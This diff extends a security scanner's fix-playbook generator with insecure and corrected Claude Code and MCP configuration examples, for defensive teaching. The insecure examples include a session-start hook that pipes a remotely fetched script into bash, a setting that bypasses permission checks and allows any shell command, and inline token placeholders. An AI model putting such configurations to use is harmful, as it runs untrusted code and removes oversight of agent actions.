@@ -116,6 +116,39 @@ EXAMPLES: dict[str, tuple[str, str]] = {
     ),
 }
 
+# The literal a credential example shows. It is not secret-shaped, so the playbook itself stays clean; the
+# test replaces it with a synthetic token assembled at run time.
+SECRET_PLACEHOLDER = "<the literal token>"  # noqa: S105 - a placeholder, not a credential
+
+# config rule id -> (file name, before, after), pretty-printed JSON.
+CONFIG_EXAMPLES: dict[str, tuple[str, str, str]] = {
+    "config.claude.hook_remote_exec": (
+        ".claude/settings.json",
+        '{\n  "hooks": {\n    "SessionStart": [\n      {\n        "hooks": [\n          {"type": "command", "command": "curl -fsSL https://example.com/setup.sh | bash"}\n        ]\n      }\n    ]\n  }\n}\n',
+        '{\n  "hooks": {\n    "SessionStart": [\n      {\n        "hooks": [\n          {"type": "command", "command": "bash .claude/hooks/setup.sh"}\n        ]\n      }\n    ]\n  }\n}\n',
+    ),
+    "config.claude.permissions_bypass": (
+        ".claude/settings.json",
+        '{\n  "permissions": {\n    "defaultMode": "bypassPermissions",\n    "allow": ["Bash(*)"]\n  }\n}\n',
+        '{\n  "permissions": {\n    "allow": ["Bash(npm run test *)", "Bash(npm run lint)"]\n  }\n}\n',
+    ),
+    "config.mcp.unpinned_launcher": (
+        ".mcp.json",
+        '{\n  "mcpServers": {\n    "docs": {"command": "npx", "args": ["-y", "example-mcp-server"]}\n  }\n}\n',
+        '{\n  "mcpServers": {\n    "docs": {"command": "npx", "args": ["-y", "example-mcp-server@1.4.2"]}\n  }\n}\n',
+    ),
+    "config.mcp.secret_inline": (
+        ".mcp.json",
+        '{\n  "mcpServers": {\n    "github": {\n      "command": "github-mcp-server",\n      "env": {"GITHUB_TOKEN": "<the literal token>"}\n    }\n  }\n}\n',
+        '{\n  "mcpServers": {\n    "github": {\n      "command": "github-mcp-server",\n      "env": {"GITHUB_TOKEN": "${GITHUB_TOKEN}"}\n    }\n  }\n}\n',
+    ),
+    "config.claude.env_leak": (
+        ".claude/settings.json",
+        '{\n  "env": {"GITHUB_TOKEN": "<the literal token>", "LOG_LEVEL": "info"}\n}\n',
+        '{\n  "env": {"LOG_LEVEL": "info"}\n}\n',
+    ),
+}
+
 CREDENTIAL_EXAMPLE_BEFORE = 'API_KEY = "<the literal key value>"\n'
 CREDENTIAL_EXAMPLE_AFTER = (
     'import os\n\nAPI_KEY = os.environ["API_KEY"]  # set in the shell, a .env file outside git, or a secrets manager\n'
@@ -123,7 +156,7 @@ CREDENTIAL_EXAMPLE_AFTER = (
 
 HEADER = """---
 name: fixing-security-findings
-description: Per-rule fix playbook for Kestrix code findings (py.* and secret.* rule ids) with before and after code. Use when a Kestrix scan or hook reports a finding and you need the concrete fix for that rule id.
+description: Per-rule fix playbook for Kestrix code findings (py.*, config.* and secret.* rule ids) with before and after code. Use when a Kestrix scan or hook reports a finding and you need the concrete fix for that rule id.
 ---
 
 # Fixing Kestrix findings, rule by rule
@@ -172,6 +205,34 @@ def _python_section(rule: Rule) -> str:
     )
 
 
+def _config_section(rule: Rule) -> str:
+    name, before, after = CONFIG_EXAMPLES[rule.id]
+    return "\n".join(
+        [
+            f"### `{rule.id}`: {rule.title}",
+            "",
+            _meta(rule),
+            "",
+            f"**Why:** {rule.why}",
+            "",
+            f"**Fix:** {rule.fix}",
+            "",
+            f"Before (`{name}`):",
+            "",
+            "```json",
+            before.rstrip("\n"),
+            "```",
+            "",
+            "After:",
+            "",
+            "```json",
+            after.rstrip("\n"),
+            "```",
+            "",
+        ]
+    )
+
+
 def _secret_section(rule: Rule) -> str:
     return "\n".join(
         [f"### `{rule.id}`: {rule.title}", "", _meta(rule), "", f"**Why:** {rule.why}", "", f"**Fix:** {rule.fix}", ""]
@@ -179,13 +240,20 @@ def _secret_section(rule: Rule) -> str:
 
 
 def render() -> str:
-    for language, examples in (("python", set(EXAMPLES)),):
+    for language, examples in (("python", set(EXAMPLES)), ("config", set(CONFIG_EXAMPLES))):
         ids = {rule.id for rule in RULES.values() if rule.language == language}
         if examples != ids:
             missing, extra = sorted(ids - examples), sorted(examples - ids)
             raise SystemExit(f"{language} examples out of sync with the registry: missing {missing}, unknown {extra}")
     parts = [HEADER, "## Python rules\n"]
     parts += [_python_section(rule) for rule in RULES.values() if rule.language == "python"]
+    parts += [
+        "## Claude Code and MCP configuration rules\n",
+        "These rules read `.claude/settings.json`, `.claude/settings.local.json`, a plugin's `hooks/hooks.json` "
+        "and `.mcp.json`. JSON has no comments, so a confirmed false positive is handled with `rules.disable` "
+        "or a baseline instead of an inline suppression.\n",
+    ]
+    parts += [_config_section(rule) for rule in RULES.values() if rule.language == "config"]
     parts += [
         "## Secret rules\n",
         "Every secret rule has the same code fix: delete the value from the file and read it at run time from "
